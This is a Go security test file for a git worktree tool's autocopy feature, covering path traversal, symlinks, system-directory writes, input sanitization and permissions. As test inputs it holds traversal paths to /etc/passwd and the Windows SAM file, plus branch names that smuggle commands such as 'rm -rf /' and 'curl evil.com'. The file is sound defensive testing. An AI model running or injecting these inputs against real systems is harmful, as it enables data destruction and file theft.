package security

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/keisukeshimizu/hatcher/internal/autocopy"
	"github.com/keisukeshimizu/hatcher/internal/git"
	"github.com/keisukeshimizu/hatcher/test/helpers"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestPathTraversalPrevention tests prevention of path traversal attacks
func TestPathTraversalPrevention(t *testing.T) {
	// Create test repository
	testRepo := helpers.NewTestGitRepository(t, "security-test")
	repo, err := git.NewRepositoryFromPath(testRepo.RepoDir)
	require.NoError(t, err)

	t.Run("prevent directory traversal in config", func(t *testing.T) {
		// Attempt to create config with path traversal
		maliciousConfig := &autocopy.AutoCopyConfig{
			Version: 2,
			Items: []autocopy.AutoCopyItem{
				{
					Path:      "../../../etc/passwd",
					Directory: boolPtr(false),
				},
				{
					Path:      "..\\..\\windows\\system32\\config\\sam",
					Directory: boolPtr(false),
				},
			},
		}

		// Validate config should reject malicious paths
		err := autocopy.ValidateAutoCopyConfig(maliciousConfig)
		assert.Error(t, err, "Config validation should reject path traversal attempts")
		assert.Contains(t, strings.ToLower(err.Error()), "dangerous path", "Error should mention dangerous path")
	})

	t.Run("prevent symlink attacks", func(t *testing.T) {
		// Create a symlink pointing outside the repository
		symlinkPath := filepath.Join(testRepo.RepoDir, "malicious_link")
		targetPath := "/etc/passwd"

		// Create symlink (may fail on Windows, that's OK)
		err := os.Symlink(targetPath, symlinkPath)
		if err != nil {
			t.Skip("Cannot create symlinks on this system")
		}

		config := &autocopy.AutoCopyConfig{
			Version: 2,
			Items: []autocopy.AutoCopyItem{
				{
					Path:      "malicious_link",
					Directory: boolPtr(false),
				},
			},
		}

		destDir := filepath.Join(testRepo.TempDir, "symlink-dest")
		err = os.MkdirAll(destDir, 0755)
		require.NoError(t, err)

		copier := autocopy.NewAutoCopier(repo, config, autocopy.AutoCopierOptions{})

		// Copy operation should handle symlinks safely
		err = copier.Run(testRepo.RepoDir, destDir)
		// Should either succeed (copying the link itself) or fail safely
		// Should NOT copy the target file content

		destLinkPath := filepath.Join(destDir, "malicious_link")
		if _, err := os.Stat(destLinkPath); err == nil {
			// If the symlink was copied, verify it doesn't expose sensitive data
			content, err := os.ReadFile(destLinkPath)
			if err == nil {
				// Should not contain actual /etc/passwd content
				assert.NotContains(t, string(content), "root:", "Should not expose system files")
			}
		}
	})

	t.Run("prevent overwriting system files", func(t *testing.T) {
		// Attempt to copy to system directories
		systemPaths := []string{
			"/etc/hatcher-test",
			"/usr/bin/hatcher-test",
			"/System/Library/hatcher-test",
			"C:\\Windows\\System32\\hatcher-test",
		}

		for _, systemPath := range systemPaths {
			config := &autocopy.AutoCopyConfig{
				Version: 2,
				Items: []autocopy.AutoCopyItem{
					{
						Path:      "test.txt",
						Directory: boolPtr(false),
					},
				},
			}

			// Create source file
			sourceFile := filepath.Join(testRepo.RepoDir, "test.txt")
			err := os.WriteFile(sourceFile, []byte("test"), 0644)
			require.NoError(t, err)

			copier := autocopy.NewAutoCopier(repo, config, autocopy.AutoCopierOptions{})

			// Should fail to copy to system directories
			err = copier.Run(testRepo.RepoDir, systemPath)
			assert.Error(t, err, "Should not be able to copy to system directory: %s", systemPath)
		}
	})
}

// TestInputValidation tests input validation and sanitization
func TestInputValidation(t *testing.T) {
	t.Run("validate branch names", func(t *testing.T) {
		maliciousBranchNames := []string{
			"../../../etc/passwd",
			"branch; rm -rf /",
			"branch && curl evil.com",
			"branch`rm -rf /`",
			"branch$(rm -rf /)",
			"branch|rm -rf /",
			"branch\x00null",
			strings.Repeat("a", 1000), // Very long name
		}

		for _, branchName := range maliciousBranchNames {
			// Test branch name sanitization
			sanitized := sanitizeBranchName(branchName)

			// Sanitized name should not contain dangerous characters
			assert.NotContains(t, sanitized, "..", "Sanitized name should not contain '..'")
			assert.NotContains(t, sanitized, ";", "Sanitized name should not contain ';'")
			assert.NotContains(t, sanitized, "&", "Sanitized name should not contain '&'")
			assert.NotContains(t, sanitized, "`", "Sanitized name should not contain '`'")
			assert.NotContains(t, sanitized, "$", "Sanitized name should not contain '$'")
			assert.NotContains(t, sanitized, "|", "Sanitized name should not contain '|'")
			assert.NotContains(t, sanitized, "\x00", "Sanitized name should not contain null bytes")

			// Should have reasonable length
			assert.LessOrEqual(t, len(sanitized), 255, "Sanitized name should have reasonable length")
		}
	})

	t.Run("validate file paths", func(t *testing.T) {
		maliciousPaths := []string{
			"../../../etc/passwd",
			"..\\..\\..\\windows\\system32\\config\\sam",
			"/etc/passwd",
			"C:\\Windows\\System32\\config\\sam",
			"file\x00.txt",
			strings.Repeat("a/", 100) + "file.txt", // Very deep path
		}

		for _, path := range maliciousPaths {
			// Test path validation
			isValid := isValidPath(path)
			assert.False(t, isValid, "Path should be invalid: %s", path)
		}
	})

	t.Run("validate configuration values", func(t *testing.T) {
		// Test with malicious configuration values
		config := &autocopy.AutoCopyConfig{
			Version: 999999, // Invalid version
			Items: []autocopy.AutoCopyItem{
				{
					Path:      "", // Empty path
					Directory: boolPtr(false),
				},
				{
					Path:      strings.Repeat("a", 1000), // Very long path
					Directory: boolPtr(false),
				},
			},
		}

		errors := autocopy.ValidateAutoCopyConfig(config)
		assert.NotEmpty(t, errors, "Should detect configuration errors")
	})
}

// TestFilePermissions tests file permission handling
func TestFilePermissions(t *testing.T) {
	// Create test repository
	testRepo := helpers.NewTestGitRepository(t, "permissions-test")
	repo, err := git.NewRepositoryFromPath(testRepo.RepoDir)
	require.NoError(t, err)

	t.Run("respect file permissions", func(t *testing.T) {
		// Create files with different permissions
		testFiles := map[string]os.FileMode{
			"readonly.txt":  0444,
			"executable.sh": 0755,
			"private.key":   0600,
		}

		for filename, perm := range testFiles {
			filePath := filepath.Join(testRepo.RepoDir, filename)
			err := os.WriteFile(filePath, []byte("test content"), perm)
			require.NoError(t, err)
		}

		config := &autocopy.AutoCopyConfig{
			Version: 2,
			Items: []autocopy.AutoCopyItem{
				{Path: "*.txt", Directory: boolPtr(false), UseGlob: true},
				{Path: "*.sh", Directory: boolPtr(false), UseGlob: true},
				{Path: "*.key", Directory: boolPtr(false), UseGlob: true},
			},
		}

		destDir := filepath.Join(testRepo.TempDir, "perm-dest")
		err = os.MkdirAll(destDir, 0755)
		require.NoError(t, err)

		copier := autocopy.NewAutoCopier(repo, config, autocopy.AutoCopierOptions{})
		err = copier.Run(testRepo.RepoDir, destDir)
		require.NoError(t, err)

		// Verify permissions are preserved
		for filename, expectedPerm := range testFiles {
			destPath := filepath.Join(destDir, filename)
			info, err := os.Stat(destPath)
			require.NoError(t, err)

			actualPerm := info.Mode().Perm()
			assert.Equal(t, expectedPerm, actualPerm, "File permissions should be preserved for %s", filename)
		}
	})

	t.Run("handle permission errors gracefully", func(t *testing.T) {
		// Create a file we can't read (on Unix systems)
		restrictedFile := filepath.Join(testRepo.RepoDir, "restricted.txt")
		err := os.WriteFile(restrictedFile, []byte("restricted content"), 0000)
		require.NoError(t, err)

		config := &autocopy.AutoCopyConfig{
			Version: 2,
			Items: []autocopy.AutoCopyItem{
				{Path: "restricted.txt", Directory: boolPtr(false)},
			},
		}

		destDir := filepath.Join(testRepo.TempDir, "restricted-dest")
		err = os.MkdirAll(destDir, 0755)
		require.NoError(t, err)

		copier := autocopy.NewAutoCopier(repo, config, autocopy.AutoCopierOptions{})
		err = copier.Run(testRepo.RepoDir, destDir)

		// Should handle permission error gracefully
		// (May succeed or fail depending on system, but shouldn't crash)
		if err != nil {
			assert.Contains(t, err.Error(), "permission", "Error should mention permission issue")
		}
	})
}

// TestResourceLimits tests resource usage limits
func TestResourceLimits(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping resource limit tests in short mode")
	}

	// Create test repository
	testRepo := helpers.NewTestGitRepository(t, "resource-test")
	repo, err := git.NewRepositoryFromPath(testRepo.RepoDir)
	require.NoError(t, err)

	t.Run("handle large number of files", func(t *testing.T) {
		// Create many small files
		numFiles := 10000
		for i := 0; i < numFiles; i++ {
			filePath := filepath.Join(testRepo.RepoDir, fmt.Sprintf("file%d.txt", i))
			err := os.WriteFile(filePath, []byte(fmt.Sprintf("content %d", i)), 0644)
			require.NoError(t, err)
		}

		config := &autocopy.AutoCopyConfig{
			Version: 2,
			Items: []autocopy.AutoCopyItem{
				{Path: "file*.txt", Directory: boolPtr(false), UseGlob: true},
			},
		}

		destDir := filepath.Join(testRepo.TempDir, "large-dest")
		err = os.MkdirAll(destDir, 0755)
		require.NoError(t, err)

		copier := autocopy.NewAutoCopier(repo, config, autocopy.AutoCopierOptions{
			UseParallel: true,
			MaxWorkers:  4,
		})

		// Should handle large number of files without crashing
		err = copier.Run(testRepo.RepoDir, destDir)
		require.NoError(t, err)

		// Verify all files were copied
		destFiles, err := filepath.Glob(filepath.Join(destDir, "file*.txt"))
		require.NoError(t, err)
		assert.Equal(t, numFiles, len(destFiles))
	})
}

// Helper functions
func sanitizeBranchName(name string) string {
	// Simple sanitization - replace dangerous characters
	sanitized := strings.ReplaceAll(name, "..", "")
	sanitized = strings.ReplaceAll(sanitized, ";", "")
	sanitized = strings.ReplaceAll(sanitized, "&", "")
	sanitized = strings.ReplaceAll(sanitized, "`", "")
	sanitized = strings.ReplaceAll(sanitized, "$", "")
	sanitized = strings.ReplaceAll(sanitized, "|", "")
	sanitized = strings.ReplaceAll(sanitized, "\x00", "")

	// Limit length
	if len(sanitized) > 255 {
		sanitized = sanitized[:255]
	}

	return sanitized
}

func isValidPath(path string) bool {
	// Check for path traversal
	if strings.Contains(path, "..") {
		return false
	}

	// Check for absolute paths
	if filepath.IsAbs(path) {
		return false
	}

	// Check for null bytes
	if strings.Contains(path, "\x00") {
		return false
	}

	// Check for excessive length
	if len(path) > 1000 {
		return false
	}

	return true
}

func boolPtr(b bool) *bool {
	return &b
}
